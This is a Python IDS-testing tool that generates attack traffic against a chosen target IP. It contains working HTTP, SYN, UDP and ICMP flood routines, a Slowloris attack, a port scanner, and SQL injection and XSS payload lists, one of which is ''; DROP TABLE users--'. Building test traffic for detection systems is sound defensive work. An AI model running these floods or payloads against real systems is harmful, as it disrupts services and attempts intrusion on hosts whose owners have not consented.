"""
Windows-Compatible Attack Simulator for IDS Testing

This script generates various types of network attacks for testing the IDS system.
Designed to work on Windows without requiring external tools like hping3.

Usage:
    python attack_simulator.py --attack http-flood --target 192.168.1.238 --port 8000
    python attack_simulator.py --attack port-scan --target 192.168.1.238
    python attack_simulator.py --attack mixed --target 192.168.1.238 --duration 60
"""

import socket
import time
import random
import argparse
import sys
import threading
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

# Optional: Try to import scapy for advanced attacks
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, sr1
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Note: Scapy not available. Some advanced attacks will use fallback methods.")


class AttackSimulator:
    """Simulates various network attacks for IDS testing."""

    def __init__(self, target, port=80, verbose=True):
        self.target = target
        self.port = port
        self.verbose = verbose
        self.attack_count = 0
        self.start_time = None

    def log(self, message):
        """Print timestamped log message."""
        if self.verbose:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] {message}")

    def http_flood(self, duration=30, threads=10):
        """
        Simulate HTTP flood attack (DoS-HTTP_Flood).
        Sends rapid HTTP requests to overwhelm the server.
        """
        self.log(f"Starting HTTP Flood attack on {self.target}:{self.port}")
        self.log(f"Duration: {duration}s, Threads: {threads}")
        self.start_time = time.time()
        self.attack_count = 0

        def worker():
            while time.time() - self.start_time < duration:
                try:
                    url = f"http://{self.target}:{self.port}/"
                    req = Request(url, headers={
                        'User-Agent': 'AttackSimulator/1.0',
                        'Accept': '*/*'
                    })
                    urlopen(req, timeout=1)
                    self.attack_count += 1
                except (URLError, HTTPError, socket.timeout):
                    self.attack_count += 1
                    pass
                except Exception as e:
                    if self.verbose:
                        print(f"Error: {e}")
                    pass

        # Launch threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)

        # Wait for completion
        for t in thread_list:
            t.join()

        elapsed = time.time() - self.start_time
        self.log(f"HTTP Flood completed: {self.attack_count} requests in {elapsed:.2f}s")
        self.log(f"Rate: {self.attack_count/elapsed:.2f} requests/sec")

    def port_scan(self, start_port=1, end_port=1000):
        """
        Simulate port scanning (Recon-PortScan).
        Sequentially probes ports to detect open services.
        """
        self.log(f"Starting Port Scan on {self.target}")
        self.log(f"Scanning ports {start_port}-{end_port}")
        self.start_time = time.time()
        open_ports = []

        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((self.target, port))

            if result == 0:
                open_ports.append(port)
                if self.verbose:
                    print(f"  Port {port}: OPEN")

            sock.close()

            # Progress indicator
            if port % 100 == 0:
                self.log(f"Scanned {port}/{end_port} ports...")

        elapsed = time.time() - self.start_time
        self.log(f"Port Scan completed: {len(open_ports)} open ports found in {elapsed:.2f}s")
        self.log(f"Open ports: {open_ports[:10]}{'...' if len(open_ports) > 10 else ''}")

    def syn_flood(self, count=1000):
        """
        Simulate SYN flood attack (DoS-SYN_Flood).
        Requires scapy. Falls back to TCP connect flood if scapy unavailable.
        """
        self.log(f"Starting SYN Flood attack on {self.target}:{self.port}")
        self.start_time = time.time()

        if SCAPY_AVAILABLE:
            self.log("Using Scapy for SYN flood")
            for i in range(count):
                # Random source port
                src_port = random.randint(1024, 65535)

                # Craft SYN packet
                ip = IP(dst=self.target)
                tcp = TCP(sport=src_port, dport=self.port, flags='S', seq=random.randint(0, 4294967295))

                # Send packet (no response expected)
                send(ip/tcp, verbose=0)

                if (i + 1) % 100 == 0:
                    self.log(f"Sent {i+1}/{count} SYN packets...")
        else:
            self.log("Scapy not available. Using TCP connect flood fallback")
            self._tcp_connect_flood(count)

        elapsed = time.time() - self.start_time
        self.log(f"SYN Flood completed: {count} packets in {elapsed:.2f}s")

    def _tcp_connect_flood(self, count):
        """Fallback TCP connection flood when scapy is not available."""
        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((self.target, self.port))
                sock.close()
            except:
                pass

            if (i + 1) % 100 == 0:
                self.log(f"Sent {i+1}/{count} TCP connections...")

    def udp_flood(self, count=1000, packet_size=1024):
        """
        Simulate UDP flood attack (DoS-UDP_Flood).
        Sends random UDP packets to target.
        """
        self.log(f"Starting UDP Flood attack on {self.target}:{self.port}")
        self.log(f"Sending {count} packets of {packet_size} bytes")
        self.start_time = time.time()

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(packet_size)

        for i in range(count):
            try:
                sock.sendto(bytes_data, (self.target, self.port))
            except Exception as e:
                if self.verbose:
                    print(f"Error: {e}")

            if (i + 1) % 100 == 0:
                self.log(f"Sent {i+1}/{count} UDP packets...")

        sock.close()
        elapsed = time.time() - self.start_time
        self.log(f"UDP Flood completed: {count} packets in {elapsed:.2f}s")
        self.log(f"Rate: {count/elapsed:.2f} packets/sec")

    def icmp_flood(self, count=100):
        """
        Simulate ICMP flood attack (DDoS-ICMP_Flood).
        Requires scapy or admin privileges for raw sockets.
        """
        self.log(f"Starting ICMP Flood attack on {self.target}")
        self.start_time = time.time()

        if SCAPY_AVAILABLE:
            self.log("Using Scapy for ICMP flood")
            for i in range(count):
                # Craft ICMP packet
                packet = IP(dst=self.target)/ICMP()
                send(packet, verbose=0)

                if (i + 1) % 10 == 0:
                    self.log(f"Sent {i+1}/{count} ICMP packets...")
        else:
            self.log("Scapy not available. Using system ping")
            import subprocess
            for i in range(count):
                try:
                    subprocess.run(['ping', '-n', '1', self.target],
                                 capture_output=True, timeout=1)
                except:
                    pass

                if (i + 1) % 10 == 0:
                    self.log(f"Sent {i+1}/{count} pings...")

        elapsed = time.time() - self.start_time
        self.log(f"ICMP Flood completed: {count} packets in {elapsed:.2f}s")

    def slowloris(self, duration=30, connections=100):
        """
        Simulate SlowLoris attack (DDoS-SlowLoris).
        Opens many connections and sends partial HTTP requests slowly.
        """
        self.log(f"Starting SlowLoris attack on {self.target}:{self.port}")
        self.log(f"Duration: {duration}s, Connections: {connections}")
        self.start_time = time.time()

        sockets = []

        # Open connections
        for i in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target}\r\n".encode())
                sockets.append(sock)
            except:
                pass

        self.log(f"Opened {len(sockets)} connections")

        # Keep connections alive
        while time.time() - self.start_time < duration:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(sock)

            time.sleep(10)
            self.log(f"Keeping {len(sockets)} connections alive...")

        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        elapsed = time.time() - self.start_time
        self.log(f"SlowLoris completed after {elapsed:.2f}s")

    def web_attack_sql_injection(self, endpoint="/api/test"):
        """
        Simulate SQL injection attempts (SqlInjection).
        """
        self.log(f"Starting SQL Injection test on {self.target}:{self.port}{endpoint}")

        payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1--",
            "1' AND '1'='1",
            "'; DROP TABLE users--",
            "1' UNION SELECT * FROM users--"
        ]

        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}{endpoint}?id={payload}"
                req = Request(url, headers={'User-Agent': 'SQLMap/1.0'})
                urlopen(req, timeout=2)
                self.log(f"  Sent: {payload[:50]}...")
            except:
                pass
            time.sleep(0.5)

        self.log("SQL Injection test completed")

    def web_attack_xss(self, endpoint="/api/test"):
        """
        Simulate XSS attempts (XSS).
        """
        self.log(f"Starting XSS test on {self.target}:{self.port}{endpoint}")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>"
        ]

        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}{endpoint}?input={payload}"
                req = Request(url, headers={'User-Agent': 'XSSScanner/1.0'})
                urlopen(req, timeout=2)
                self.log(f"  Sent XSS payload")
            except:
                pass
            time.sleep(0.5)

        self.log("XSS test completed")

    def benign_traffic(self, duration=30):
        """
        Generate normal benign traffic (BenignTraffic).
        Simulates regular browsing behavior.
        """
        self.log(f"Generating benign traffic for {duration}s")
        self.start_time = time.time()

        while time.time() - self.start_time < duration:
            try:
                url = f"http://{self.target}:{self.port}/"
                req = Request(url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml'
                })
                urlopen(req, timeout=2)
                self.log("  Normal request sent")
            except:
                pass

            # Random delay between requests (normal browsing)
            time.sleep(random.uniform(2, 5))

        self.log("Benign traffic generation completed")

    def mixed_attack(self, duration=60):
        """
        Run multiple attack types in sequence for comprehensive testing.
        """
        self.log(f"Starting mixed attack scenario for {duration}s")
        time_per_attack = duration // 5

        attacks = [
            ("Benign Traffic", lambda: self.benign_traffic(time_per_attack)),
            ("Port Scan", lambda: self.port_scan(1, 100)),
            ("HTTP Flood", lambda: self.http_flood(time_per_attack, threads=5)),
            ("UDP Flood", lambda: self.udp_flood(200)),
            ("Web Attacks", lambda: (self.web_attack_sql_injection(), self.web_attack_xss()))
        ]

        for name, attack_func in attacks:
            self.log(f"\n=== Starting {name} ===")
            try:
                attack_func()
            except Exception as e:
                self.log(f"Error in {name}: {e}")
            self.log(f"=== Completed {name} ===\n")
            time.sleep(2)

        self.log("Mixed attack scenario completed")


def main():
    parser = argparse.ArgumentParser(
        description='Attack Simulator for IDS Testing (Windows Compatible)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python attack_simulator.py --attack http-flood --target 192.168.1.238 --port 8000
  python attack_simulator.py --attack port-scan --target 192.168.1.238
  python attack_simulator.py --attack mixed --target 192.168.1.238 --duration 60
  python attack_simulator.py --attack benign --target 192.168.1.238

Attack Types:
  http-flood     - HTTP request flooding (DoS-HTTP_Flood)
  port-scan      - Port scanning (Recon-PortScan)
  syn-flood      - SYN packet flooding (DoS-SYN_Flood) [requires scapy]
  udp-flood      - UDP packet flooding (DoS-UDP_Flood)
  icmp-flood     - ICMP flooding (DDoS-ICMP_Flood)
  slowloris      - Slow HTTP attack (DDoS-SlowLoris)
  sql-injection  - SQL injection attempts (SqlInjection)
  xss            - Cross-site scripting (XSS)
  benign         - Normal traffic (BenignTraffic)
  mixed          - Multiple attacks in sequence
        """
    )

    parser.add_argument('--attack', required=True,
                       choices=['http-flood', 'port-scan', 'syn-flood', 'udp-flood',
                               'icmp-flood', 'slowloris', 'sql-injection', 'xss',
                               'benign', 'mixed'],
                       help='Type of attack to simulate')
    parser.add_argument('--target', required=True,
                       help='Target IP address (e.g., 192.168.1.238)')
    parser.add_argument('--port', type=int, default=80,
                       help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=30,
                       help='Attack duration in seconds (default: 30)')
    parser.add_argument('--count', type=int, default=1000,
                       help='Number of packets/requests (default: 1000)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads for HTTP flood (default: 10)')
    parser.add_argument('--start-port', type=int, default=1,
                       help='Start port for scan (default: 1)')
    parser.add_argument('--end-port', type=int, default=1000,
                       help='End port for scan (default: 1000)')
    parser.add_argument('--quiet', action='store_true',
                       help='Suppress verbose output')

    args = parser.parse_args()

    # Safety warning
    print("\n" + "="*60)
    print("WARNING: Network Attack Simulator")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack: {args.attack}")
    print("\nOnly run this against systems you own or have permission to test!")
    print("="*60)

    response = input("\nContinue? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        sys.exit(0)

    print()

    # Create simulator
    simulator = AttackSimulator(args.target, args.port, verbose=not args.quiet)

    # Run selected attack
    try:
        if args.attack == 'http-flood':
            simulator.http_flood(args.duration, args.threads)

        elif args.attack == 'port-scan':
            simulator.port_scan(args.start_port, args.end_port)

        elif args.attack == 'syn-flood':
            if not SCAPY_AVAILABLE:
                print("\nWarning: Scapy not installed. Using fallback method.")
                print("Install scapy for real SYN flood: pip install scapy")
                print("Note: Windows also requires Npcap: https://npcap.com/\n")
            simulator.syn_flood(args.count)

        elif args.attack == 'udp-flood':
            simulator.udp_flood(args.count)

        elif args.attack == 'icmp-flood':
            if not SCAPY_AVAILABLE:
                print("\nWarning: Scapy not installed. Using system ping.\n")
            simulator.icmp_flood(args.count)

        elif args.attack == 'slowloris':
            simulator.slowloris(args.duration)

        elif args.attack == 'sql-injection':
            simulator.web_attack_sql_injection()

        elif args.attack == 'xss':
            simulator.web_attack_xss()

        elif args.attack == 'benign':
            simulator.benign_traffic(args.duration)

        elif args.attack == 'mixed':
            simulator.mixed_attack(args.duration)

    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

    print("\n" + "="*60)
    print("Attack simulation completed!")
    print("Check your IDS logs and dashboard for detection results.")
    print("="*60)


if __name__ == '__main__':
    main()
